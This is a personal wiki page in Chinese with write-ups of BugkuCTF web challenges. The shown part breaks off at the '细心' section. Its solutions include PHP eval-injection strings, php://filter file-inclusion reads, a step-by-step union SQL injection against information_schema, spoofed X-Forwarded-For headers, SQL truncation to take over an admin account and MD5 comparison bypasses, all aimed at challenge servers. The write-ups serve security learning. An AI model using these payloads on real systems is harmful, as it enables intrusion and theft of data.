<!DOCTYPE HTML>
<html>
<head>
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/style.css">
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/tango.css">
    <link rel="shortcut icon" href="/wiki/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/wiki/favicon.ico" type="image/x-icon">
    <title>BugkuCTF-WEB-WriteUp - Curtails's personal knowledge wiki</title>
    <meta name="keywords" content="Technology, CTF, Network Security"/>
    <meta name="description" content="A wiki website of Curtails when I learned new knowledgy."/>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width" />

    <script type="text/x-mathjax-config">
        MathJax.Hub.Config({
          tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
        });
        </script>
    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','','ga');

        ga('create', 'UA-78529611-1', 'auto');
        ga('send', 'pageview');

    </script>
</head>

<body>
<div id="container">
    
<div id="header">
  <div id="post-nav"><a href="/wiki/">Home</a>&nbsp;»&nbsp;<a href="/wiki/#CTF">CTF</a>&nbsp;»&nbsp;BugkuCTF-WEB-WriteUp</div>
</div>
<div class="clearfix"></div>
<div id="title">BugkuCTF-WEB-WriteUp</div>
<div id="content">
  <div class="toc"><span class="toctitle">Table of Contents</span><ul>
<li><a href="#web2">Web2</a></li>
<li><a href="#_1">计算器</a></li>
<li><a href="#web_get">web基础$_GET</a></li>
<li><a href="#web_post">web基础$_POST</a></li>
<li><a href="#_2">矛盾</a></li>
<li><a href="#web3">web3</a></li>
<li><a href="#_3">域名解析</a></li>
<li><a href="#_4">你必须让他停下</a></li>
<li><a href="#_5">本地包含</a></li>
<li><a href="#1">变量1</a></li>
<li><a href="#web5">web5</a></li>
<li><a href="#_6">头等舱</a></li>
<li><a href="#_7">网站被黑</a></li>
<li><a href="#_8">管理员系统</a></li>
<li><a href="#web4">web4</a></li>
<li><a href="#flagindex">flag在index里</a></li>
<li><a href="#flag">输入密码查看flag</a></li>
<li><a href="#_9">点击一百万次</a></li>
<li><a href="#_10">备份是个好习惯</a></li>
<li><a href="#_11">成绩单查询</a></li>
<li><a href="#_12">秋名山老司机</a></li>
<li><a href="#_13">速度要快</a></li>
<li><a href="#cookies">cookies欺骗</a></li>
<li><a href="#never-give-up">never give up</a></li>
<li><a href="#welcome-to-bugkuctf">welcome to bugkuctf</a></li>
<li><a href="#_14">过狗一句话</a></li>
<li><a href="#_15">字符？正则？</a></li>
<li><a href="#skctf">前女友(SKCTF)</a></li>
<li><a href="#login1skctf">login1(SKCTF)</a></li>
<li><a href="#_16">你从哪里来</a></li>
<li><a href="#md5-collisionnupt_ctf">md5 collision(NUPT_CTF)</a></li>
<li><a href="#_17">程序员本地网站</a></li>
<li><a href="#_18">各种绕过</a></li>
<li><a href="#web8">web8</a></li>
<li><a href="#_19">细心</a></li>
<li><a href="#getshell">求getshell</a></li>
<li><a href="#insert-into">INSERT INTO注入</a></li>
<li><a href="#_20">这是一个神奇的登陆框</a></li>
<li><a href="#_21">多次</a></li>
<li><a href="#php_encrypt_1isccctf">PHP_encrypt_1(ISCCCTF)</a></li>
<li><a href="#2">文件包含2</a></li>
</ul>
</div>
<p>BugkuCTF-WEB-WriteUp</p>
<h2 id="web2">Web2</h2>
<ul>
<li>解题</li>
<li>打开网站如下（一片滑稽）</li>
<li>
<p>查看源代码</p>
</li>
<li>
<p>得到flag</p>
</li>
<li>Flag<br />
KEY{Web-2-bugKssNNikls9100}</li>
</ul>
<h2 id="_1">计算器</h2>
<ul>
<li>
<p>解题</p>
</li>
<li>
<p>打开网址输入结果，发现只能输入一位数字</p>
</li>
<li>
<p>查看元素找到maxlength</p>
</li>
<li>
<p>修改maxlength = 3</p>
</li>
<li>
<p>输入正确答案</p>
</li>
<li>
<p>Flag<br />
flag{CTF-bugku-0032}</p>
</li>
</ul>
<h2 id="web_get">web基础$_GET</h2>
<ul>
<li>解题</li>
<li>
<p>打开网址<br />
<img alt="" src="http://imglf4.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrY3kwcHhlNHk5NTRZaHFzbGl1RkZleml2bDhnNGtNdlJ3PT0.png?imageView&amp;thumbnail=500x0&amp;quality=96&amp;stripmeta=0" /></p>
</li>
<li>
<p>通过阅读代码得知用get提交数据即可</p>
</li>
<li>
<p>地址加?what=flag</p>
</li>
<li>
<p>打开修改后的网址</p>
</li>
</ul>
<p><img alt="" src="http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrZmVLRnhnSnlSaGxWd29ubXdKeVFKM0hTTVo4d2hMWGJ3PT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" /><br />
- Flag<br />
flag{bugku_get_su8kej2en}</p>
<ul>
<li>相关知识</li>
<li>$_GET </li>
</ul>
<blockquote>
<p>1、预定义的 $_GET 变量用于收集来自 method=“get” 的表单中的值。</p>
<p>2、 从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制。</p>
</blockquote>
<ul>
<li>$_POST</li>
</ul>
<blockquote>
<p>1、预定义的 $_POST 变量用于收集来自 method=“post” 的表单中的值。</p>
<p>2、从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。</p>
</blockquote>
<h2 id="web_post">web基础$_POST</h2>
<p><img alt="" src="http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrZldCaWlscVNzUFA2OXlsOFU4RTlaZzdzOWZ0cTYxQzdRPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" /></p>
<ul>
<li>
<p>解题</p>
</li>
<li>
<p>打开网址</p>
</li>
</ul>
<p><img alt="" src="http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrY3pXcURLdzVkQmlFWWxJMGRjbVg0TUtpVXlSbmxZWG1BPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" /></p>
<ul>
<li>
<p>阅读可知通过post提交数据</p>
</li>
<li>
<p>使用Firefox扩展hackbar；填写url；填写post_data为what=flag；execute</p>
</li>
</ul>
<p><img alt="" src="http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrVndVcDNUQ1VRNnNoQnpVb0NRaDJEcll4UFNUTXdXL2p3PT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" /></p>
<ul>
<li>execute后</li>
</ul>
<p><img alt="" src="http://imglf5.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUkljTVpVUEo5VHZaNmtwQWowNnVoREN0WW5jODlsODBBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" /></p>
<ul>
<li>或者bp抓包 改变请求方式 空一行加上<code>what=flag</code> -foward 网页会显示flag</li>
<li>Flag<br />
flag{bugku_get_ssseint67se}</li>
</ul>
<h2 id="_2">矛盾</h2>
<p><img alt="" src="http://imglf4.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUThLWko4bnBNc2xkQkQ4ZU5haUhPNXlTOVU2S2VwQXFBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" /></p>
<ul>
<li>解题</li>
<li>打开网址</li>
</ul>
<p><img alt="" src="http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUjBGN0tGcktDT1pmVzBMR1dPMXFabStHVU5wOFdsVWp3PT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" /></p>
<ul>
<li>
<p>阅读可得知数据用get传参</p>
</li>
<li>
<p>有两个条件判断，当num不是数字或数字串(not numeric)同时num等于1时 返回flag，此为矛盾。</p>
</li>
<li>
<p>“==”有数据类型转换，所以num取1xxx格式任意由1和字母组成的串即可。</p>
</li>
<li>
<p>修改地址</p>
</li>
</ul>
<p><img alt="" src="http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrYkhLeGQwemZNU2NOTkY2dlg1MXFJcW13bnFyczZZSHR3PT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" /><br />
- Flag<br />
flag{bugku-789-ps-ssdf}</p>
<h2 id="web3">web3</h2>
<p>循环弹窗<br />
- 阻止此页面创建更多对话框<br />
- 看下源码 发现<code>&lt;!--&gt;</code>注释含有&amp; # 数字组成字符串为html编码<br />
- 解码得flag<br />
- KEY{J2sa42ahJK-HS11III}</p>
<h2 id="_3">域名解析</h2>
<p>题目：听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag<br />
- 把<code>123.206.87.240 flag.baidu.com</code>加入host文件中<br />
- 访问flag.baidu.com即可<br />
- KEY{DSAHDSJ82HDS2211}</p>
<h2 id="_4">你必须让他停下</h2>
<p>页面不断地跳<br />
- 看源代码发现是js脚本不断刷新<br />
  - burpsuite_pro抓包分析 send to repeater逐个go<br />
- 或者干脆禁用js 参考相应浏览器设置<br />
- flag{dummy_game_1s_s0_popular}</p>
<h2 id="_5">本地包含</h2>
<p>看题目猜测有本地包含漏洞</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;hello&#39;</span><span class="p">];</span>
<span class="k">eval</span><span class="p">(</span><span class="s2">&quot; var_dump( </span><span class="si">$a</span><span class="s2"> );&quot;</span><span class="p">);</span>
<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"> </span>
</pre></div>


<ul>
<li>首先包含了flag.php 其次获取helle值 其次打印了变量相关信息</li>
<li>通过hello值构造payload打印flag.php代码<code>?hello=1);show_source('flag.php');var_dump(3</code></li>
<li>或者<code>?hello= 1);print_r(file("./flag.php%22")</code></li>
<li>看到flag</li>
<li>flag{bug-ctf-gg-99}</li>
</ul>
<h2 id="1">变量1</h2>
<p>提示我们flag In the variable ! 看到$$args 想到全局变量GLOBALS<br />
- <code>php
  &lt;?php  
  error_reporting(0);
  include "flag1.php";
  highlight_file(__file__);
  if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
      eval("var_dump($$args);");
  }
  ?&gt;</code><br />
  阅读得知<code>preg_match("/^\w+$/",$args)</code>输入args得满足此正则表达式<br />
- 构造payload输出GLOBALS内容<code>?args=GLOBALS</code><br />
- flag{92853051ab894a64f7865cf3c2128b34}</p>
<h2 id="web5">web5</h2>
<p>hint：JSPFUCK??????答案格式CTF{**}<br />
- 看下源码含有<code>[][(![]+[])[+[]]+([![]]+[][[]])...</code><br />
- 把此代码丢进console运行<br />
- ctf{whatfk}"</p>
<h2 id="_6">头等舱</h2>
<p>连接是以hd.php结尾 hint：hidden提示<br />
- 源码啥也没有抓个包<br />
- 在response-raw中看到了flag<br />
- flag{Bugku_k8_23s_istra}</p>
<h2 id="_7">网站被黑</h2>
<p>一个被黑的网页 hint：链接以webshell结尾<br />
- 用脚本扫一下看到<code>http://123.206.87.240:8002/webshell/shell.php</code><br />
- 登录页面有密码 抓包爆破一下<br />
- 得到密码hack登录<br />
- flag{hack_bug_ku035} </p>
<h2 id="_8">管理员系统</h2>
<p>随便输入账号密码提示：IP禁止访问，请联系本地管理员登陆，IP已被记录. <br />
hint：本地管理员<br />
- 查看源码有注释base64竟然在最底下中间空了很大空白<br />
- 解码得test123<br />
- <mark>X-Forwarded-For</mark><br />
- 伪造xff头<code>X-Forwarded-For: 127.0.0.1</code>添加到raw中<br />
- go raw中出现flag<br />
- The flag is: 85ff2ee4171396724bae20c0bd851f6b</p>
<h2 id="web4">web4</h2>
<p>hint：看看源代码<br />
- 查看源码两个变量p1 p2是由% 数字组成的字符串 还有额外类似字符串代码提示unescape 为escape编码<br />
- 解码按照代码提示合并得<br />
<code>php
  function checksubmit(){
    var a=document.getelementbyid("password");
    if("undefined"!=typeof a){
      if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)
        return!0;
      alert("error");
      a.focus(); 
      return!1
        }
      }
      document.getelementbyid("levelquest").onsubmit=checksubmit;</code><br />
- 代码意思大致是password=67d709b2b54aa2aa648cf6e87a7114f1<br />
- 输入字符串<br />
- KEY{J22JK-HS11}</p>
<h2 id="flagindex">flag在index里</h2>
<p>标题提示index 看下源码没提示 猜测index.php里flag<br />
- 文件包含漏洞 利用php://filter读取base64编码源码后的代码<br />
- 构造payload<code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code><br />
- 解码阅读源码看到flag<br />
- flag{edulcni_elif_lacol_si_siht}</p>
<h2 id="flag">输入密码查看flag</h2>
<p>url=http://123.206.87.240:8002/baopo/ hint：爆破<br />
密码五位数<br />
- 密码13579 登录<br />
- baopo好慢..<br />
- flag{bugku-baopo-hah} </p>
<h2 id="_9">点击一百万次</h2>
<p>打开好像让我们点击一百万次<br />
- 看源码js确实从0开始 修改变量初始值为999999<br />
- 用harkbar修改clicks=1000001<br />
- flag{bugku-baopo-hah} </p>
<h2 id="_10">备份是个好习惯</h2>
<p>打开网址 得hex代码 转换成ASCII失败 应该不是hex<br />
hint：备份<br />
- 用py扫一下目录得到 http://123.206.87.240:8002/web16/index.php.bak<br />
- 下载打开</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span>
<span class="k">include_once</span> <span class="s2">&quot;flag.php&quot;</span><span class="p">;</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="nv">$str</span> <span class="o">=</span> <span class="nx">strstr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">],</span> <span class="s1">&#39;?&#39;</span><span class="p">);</span>
<span class="nv">$str</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="nv">$str</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
<span class="nb">parse_str</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$key1</span><span class="p">);</span>  
<span class="k">echo</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$key2</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$key1</span><span class="p">)</span> <span class="o">==</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$key2</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$key1</span> <span class="o">!==</span> <span class="nv">$key2</span><span class="p">){</span>
  <span class="k">echo</span> <span class="nv">$flag</span><span class="o">.</span><span class="s2">&quot;取得flag&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x">  </span>
</pre></div>


<ul>
<li>大致意思是读取url参数并且把字符key去掉<code>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2</code>条件满足后输出flag</li>
<li>kekeyy代替key</li>
<li>第一个方法</li>
<li>mad无法处理数组 默认返回null</li>
<li><code>?kekeyy[]=something&amp;kekeyy[]=anything</code></li>
<li>第二个方法： <br />
  两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的<br />
  所以找出加密后0e开头的字符串<br />
<code>QNKCDZO
  240610708
  s878926199a
  s155964671a
  s214587387a
  s214587387a</code></li>
<li><code>?kekeyy1=240610708&amp;kekeyy2=QNKCDZO</code></li>
<li>Bugku{OH_YOU_FIND_MY_MOMY}</li>
</ul>
<h2 id="_11">成绩单查询</h2>
<p>标准sql注入题<br />
- hackbar注入<code>id=1'#</code> 成功<br />
- 判断列数<code>id=1' order by 4#</code>四列，五列测试不对<br />
- 联合查询<code>id=0' union select 1,2,3,4#</code>z成功<br />
- 查询<code>id=0' union select 1,database(),user(),version()#</code><br />
- 看到数据库名称含有flag<br />
<code>skctf_flag     skctf_flag@localhost    5.5.34-log</code><br />
- 查询表名 <code>id=0' union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema='skctf_flag')#</code>得到表名fl4g<br />
- 查询表的列名<code>id=0'union select 1,2,3,(select group_concat(column_name)
 from information_schema.columns where table_name='fl4g')#</code>得出列skctf_flag<br />
- 查询数据<code>id=0' union select 1,2,3,(select skctf_flag from fl4g)#</code><br />
- BUGKU{Sql_INJECT0N_4813drd8hz4}</p>
<h2 id="_12">秋名山老司机</h2>
<p>题目：亲请在2s内计算老司机的车速是多少<br />
1453188555<em>112050552</em>2035911046+129564843-990655641<em>10801555</em>1826101406-742934982+1688885834-387627083+502307721=?;<br />
车速太快人不行了 借助py<br />
- 看看前辈 https://www.jianshu.com/p/b0a5d72c8bae<br />
<code>python
  #改一下url
  import requests
  import re
  url = 'http://120.24.86.145:8002/qiumingshan/'
  s = requests.Session()
  source = s.get(url)
  expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()
  result = eval(expression)
  post = {'value': result}
  print(s.post(url, data = post).text)</code><br />
- 跑了好几次<br />
- Bugku{YOU_DID_IT_BY_SECOND}</p>
<h2 id="_13">速度要快</h2>
<p>打开网页：我感觉你得快点!!!<br />
- 看源码有注释<br />
- 抓包看一下raw中有base64 解码后验证不是flag<br />
- 每一次go base64都不一样<br />
- 写脚本<br />
  ```python<br />
  #coding:utf-8<br />
  import requests<br />
  import base64</p>
<p>url='http://123.206.87.240:8002/web6/'<br />
  s=requests.Session()<br />
  header=s.get(url).headers<br />
  #print(header)<br />
  flag = base64.b64decode(base64.b64decode(header['flag']).decode() .split(':')[1]).decode() #对其进行base64两次解密</p>
<p>data={'margin':flag}</p>
<p>print(s.post(url=url,data=data).content.decode())<br />
  ```<br />
- KEY{111dd62fcd377076be18a}</p>
<h2 id="cookies">cookies欺骗</h2>
<p>打开网址 url=http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=<br />
- 好像有base64 解码得<code>keys.txt</code><br />
- 尝试用filename访问index.php（原url使用base64，这也将index.php进行编码<code>aW5kZXgucGhw</code><br />
- 构造 http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw<br />
- 显示信息切换行数都有 写脚本获取全部代码<br />
<code>python 
  import requests
  a=30
  for i in range(a):
      url="http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" 
      s=requests.get(url)
      print s.text</code><br />
得到源代码<br />
<code>php
  &lt;?php
  error_reporting(0);
  $file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
  $line=isset($_GET['line'])?intval($_GET['line']):0;
  if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");
  $file_list = array(
  '0' =&gt;'keys.txt',
  '1' =&gt;'index.php',
  );
  if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){
  $file_list[2]='keys.php';
  }
  if(in_array($file, $file_list)){
  $fa = file($file);
  echo $fa[$line];
  }
  ?&gt;</code><br />
- 阅读得知cookie margin=margin<br />
- 抓包raw加上Cookie: margin=margin 修改filename=a2V5cy5waHA=  然后go<br />
- KEY{key_keys}</p>
<h2 id="never-give-up">never give up</h2>
<p>url=http://123.206.87.240:8006/test/hello.php<br />
显示：never never never give up !!! <br />
- 源码提1p.html 访问 123.206.87.240:8006/test/1p.html结果跳转bugku论坛<br />
- 看一下这1p.html源码 view-source:http://123.206.87.240:8006/test/1p.html<br />
- Words变量的值先url解码，再base64解码，再url解码</p>
<div class="hlcode"><pre><span class="x">  &quot;;if(!$_GET[&#39;id&#39;])</span>
<span class="x">{</span>
<span class="x">    header(&#39;Location: hello.php?id=1&#39;);</span>
<span class="x">    exit();</span>
<span class="x">}</span>
<span class="x">$id=$_GET[&#39;id&#39;];</span>
<span class="x">$a=$_GET[&#39;a&#39;];</span>
<span class="x">$b=$_GET[&#39;b&#39;];</span>
<span class="x">if(stripos($a,&#39;.&#39;))</span>
<span class="x">{</span>
<span class="x">    echo &#39;no no no no no no no&#39;;</span>
<span class="x">    return ;</span>
<span class="x">}</span>
<span class="x">$data = @file_get_contents($a,&#39;r&#39;);</span>
<span class="x">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span>
<span class="x">{</span>
<span class="x">    require(&quot;f4l2a3g.txt&quot;);</span>
<span class="x">}</span>
<span class="x">else</span>
<span class="x">{</span>
<span class="x">    print &quot;never never never give up !!!&quot;;</span>
<span class="x">}</span>
<span class="x">?&gt;</span>
</pre></div>


<ul>
<li>看到f4l2a3g.txt 这个竟然能直接访问 http://123.206.87.240:8006/test/f4l2a3g.txt</li>
<li>flag{tHis_iS_THe_fLaG}</li>
</ul>
<h2 id="welcome-to-bugkuctf">welcome to bugkuctf</h2>
<p>挂了</p>
<h2 id="_14">过狗一句话</h2>
<p>挂了</p>
<h2 id="_15">字符？正则？</h2>
<div class="hlcode"><pre><span class="p">.</span>                                  <span class="err">匹配除</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span> <span class="err">之外的任何单个字符</span>

<span class="o">*</span>                                 <span class="err">匹配它前面的表达式</span><span class="mi">0</span><span class="err">次或多次，等价于</span><span class="p">{</span><span class="mi">0</span><span class="p">,}</span>

<span class="p">{</span><span class="mi">4</span><span class="p">,</span><span class="mi">7</span><span class="p">}</span>                           <span class="err">最少匹配</span> <span class="mi">4</span> <span class="err">次且最多匹配</span> <span class="mi">7</span> <span class="err">次，结合前面的</span> <span class="p">.</span> <span class="err">也就是匹配</span> <span class="mi">4</span> <span class="err">到</span> <span class="mi">7</span> <span class="err">个任意字符</span>

<span class="err">\</span><span class="o">/</span>                                <span class="err">匹配</span> <span class="o">/</span> <span class="err">，这里的</span> <span class="err">\</span> <span class="err">是为了转义</span>

<span class="p">[</span><span class="n">a</span><span class="o">-</span><span class="n">z</span><span class="p">]</span>                           <span class="err">匹配所有小写字母</span>

<span class="p">[</span><span class="o">:</span><span class="n">punct</span><span class="o">:</span><span class="p">]</span>                     <span class="err">匹配任何标点符号</span>

<span class="o">/</span><span class="n">i</span>                                <span class="err">表示不分大小写</span>
</pre></div>


<ul>
<li>payload<code>?id=keykeyaaaakey:/a/keyz;</code></li>
<li>KEY{0x0SIOPh550afc}</li>
</ul>
<h2 id="skctf">前女友(SKCTF)</h2>
<p>打开网址查看源代码发现code.txt<br />
- 根据代码构造payload<code>http://123.206.31.85:49162/index.php?v1[]=a&amp;v2[]=b&amp;v3[]=10</code><br />
- 题目类似 备份是个好习惯<br />
- SKCTF{Php_1s_tH3_B3St_L4NgUag3}</p>
<h2 id="login1skctf">login1(SKCTF)</h2>
<p>hint:SQL约束攻击 打开网址一个管理系统登录页面<br />
可以注册 登录账号后显示：不是管理员还想看flag？！ <br />
注册账号admin 显示账号已存在<br />
- 看看这篇文章https://www.freebuf.com/articles/web/124537.html<br />
- 大致两点信息-<br />
  - sql有字符串约束条件例如最长15字符 输入字符16的字符串 只会存储前字符15<br />
  - sql处理字符串默认修建空格 "abc"=="abc   "<br />
- 所以我们注册"admin   " 在用这个账户登录即可<br />
- SKCTF{4Dm1n_HaV3_GreAt_p0w3R} </p>
<h2 id="_16">你从哪里来</h2>
<p>url=http://123.206.87.240:9009/from.php<br />
显示areyoufrom google?<br />
- 抓包添加referer<code>Referer: https://www.google.com</code>  -go<br />
- 或者直接在hackbar里添加referer<br />
- HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。<br />
- flag{bug-ku_ai_admin}</p>
<h2 id="md5-collisionnupt_ctf">md5 collision(NUPT_CTF)</h2>
<p>url=http://123.206.87.240:9009/md5.php<br />
显示：please input a<br />
hint：md5 collision MD5碰撞<br />
- 所以分析我们要传入参数a a值为MD5加密后0e开头<br />
- 抓包 在md5.php加上get参数<code>？a=s155964671a</code> <br />
- go 看到flag<br />
- 最好抓包分析一下传参方式<br />
- flag{md5_collision_is_easy}</p>
<h2 id="_17">程序员本地网站</h2>
<p>hint：请从本地访问<br />
这道题很前面那道 管理员系统类似 构造xff<br />
- 抓包添加<code>X-Forwarded-For: 127.0.0.1</code> -go<br />
- flag{loc-al-h-o-st1}</p>
<h2 id="_18">各种绕过</h2>
<p>题目：各种绕过呦 打开url看见代码如下 算是一道代码审计</p>
<div class="hlcode"><pre><span class="x"> </span><span class="cp">&lt;?php</span>
<span class="nb">highlight_file</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
<span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
<span class="nv">$flag</span> <span class="o">=</span> <span class="s1">&#39;flag{xxxxxxxxxxxxxxxxxx}&#39;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">])</span>
        <span class="k">print</span> <span class="s1">&#39;passwd can not be uname.&#39;</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nb">sha1</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">])</span><span class="o">&amp;</span><span class="p">(</span><span class="nv">$_GET</span>
                                                  <span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;margin&#39;</span><span class="p">))</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Flag: &#39;</span><span class="o">.</span><span class="nv">$flag</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="k">print</span> <span class="s1">&#39;sorry!&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"> </span>
</pre></div>


<ul>
<li>阅读可知三个参数uname id passwd 前两个get传参 后者post</li>
<li>阅读代码 uname不能和passwd相等 但要满足sha1二者值相等 想当然想到了MD5类似<br />
  构造数组</li>
<li>构造payload<code>?uname[]=0&amp;id=margin</code> 同时用hackbar输入postdata<code>passwd[]=1</code></li>
<li>flag{HACK_45hhs_213sDD}</li>
</ul>
<h2 id="web8">web8</h2>
<p>题目：txt？？？ 打开url 又是一道代码审计 hint:flag.txt</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span>
<span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ac</span><span class="p">))</span>
<span class="p">{</span>
  <span class="nv">$f</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$fn</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$ac</span> <span class="o">===</span> <span class="nv">$f</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;This is flag:&quot;</span> <span class="o">.</span><span class="s2">&quot; </span><span class="si">$flag</span><span class="s2">&lt;/p&gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<ul>
<li>根据hint 访问http://123.206.87.240:8002/web8/flag.txt 显示文本flags</li>
<li>阅读代码可知f为fn的内容 ac===f时 输出flag</li>
<li>构造payload<code>?ac=flas&amp;fn=flag.txt</code></li>
<li>flag{3cfb7a90fc0de31}</li>
</ul>
<h2 id="_19">细心</h2>
<p>题目：想办法变成admin<br />
